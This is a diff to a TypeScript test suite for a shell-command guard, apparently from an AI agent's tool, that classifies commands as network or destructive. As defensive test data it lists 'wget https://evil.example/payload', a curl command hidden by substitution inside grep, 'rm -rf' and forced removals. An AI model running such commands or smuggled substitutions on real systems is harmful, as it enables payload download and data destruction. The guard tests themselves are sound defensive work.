@@ -92,6 +92,17 @@ describe("guardShellCommand", () => {
     });
   });
 
+  it("does not classify grep search text as network or destructive", () => {
+    const risk = inspectShellCommand('grep -n "Invoke-WebRequest\\|Invoke-RestMethod\\|powershell" src/exec/local-shell.ts | head -40');
+    expect(risk).toEqual({ needsNetwork: false, destructive: false });
+    expect(inspectShellCommand('rg "rm -rf" src')).toEqual({ needsNetwork: false, destructive: false });
+  });
+
+  it("does not let command substitution hide inside an inspection command", () => {
+    const risk = inspectShellCommand('grep "$(curl https://example.com)" src/file.txt');
+    expect(risk.needsNetwork).toBe(true);
+  });
+
   describe("network/egress command guard (authority independent of model-declared intent)", () => {
     const networkCommands = [
       "wget https://evil.example/payload",
@@ -124,13 +135,28 @@ describe("guardShellCommand", () => {
     expect(inspectShellCommand("git fetch origin")).toEqual({ needsNetwork: true, destructive: false });
     expect(inspectShellCommand("Remove-Item .\\build\\old -Recurse -Force")).toEqual({ needsNetwork: false, destructive: true });
     expect(inspectShellCommand("kill -TERM 1234")).toEqual({ needsNetwork: false, destructive: true });
-    expect(inspectShellCommand("systemctl restart example-app.service")).toEqual({ needsNetwork: false, destructive: true });
+    expect(inspectShellCommand("systemctl restart jk-cloud.service")).toEqual({ needsNetwork: false, destructive: true });
     expect(inspectShellCommand("bash scripts/reload-jk-runtime.sh")).toEqual({ needsNetwork: false, destructive: true });
     expect(inspectShellCommand("./scripts/reload-jk-runtime.sh")).toEqual({ needsNetwork: false, destructive: true });
+    expect(inspectShellCommand("bash scripts/reload-jk-runtime.sh --check")).toEqual({ needsNetwork: false, destructive: false });
+    expect(inspectShellCommand("./scripts/reload-jk-runtime.sh --check")).toEqual({ needsNetwork: false, destructive: false });
     expect(inspectShellCommand("sed -n '1,80p' scripts/reload-jk-runtime.sh")).toEqual({ needsNetwork: false, destructive: false });
     expect(inspectShellCommand("cat scripts/reload-jk-runtime.sh")).toEqual({ needsNetwork: false, destructive: false });
     expect(() => guardShellCommand("git fetch origin", { needsNetwork: true })).not.toThrow();
     expect(() => guardShellCommand("Remove-Item .\\build\\old -Recurse -Force", { destructive: true })).not.toThrow();
+  });
+
+  it("ships the high-level JK runtime reload action referenced by the approval policy", async () => {
+    const scriptPath = path.join(process.cwd(), "scripts", "reload-jk-runtime.sh");
+    await expect(fs.access(scriptPath)).resolves.toBeUndefined();
+    const script = await fs.readFile(scriptPath, "utf8");
+    expect(script).toContain("--check");
+    expect(script).toContain("MainPID");
+    expect(script).toContain("Restart=always");
+    expect(script).toContain("JK_RELOAD_DELAY_SEC");
+    expect(script).toContain("nohup /bin/sh -c");
+    expect(script).toContain("reload scheduled");
+    expect(script).not.toContain('kill -TERM "${old_pid}"');
   });
 
   it("keeps direct AWS cost/exposure/credential mutations outside supervised non-destructive work", () => {
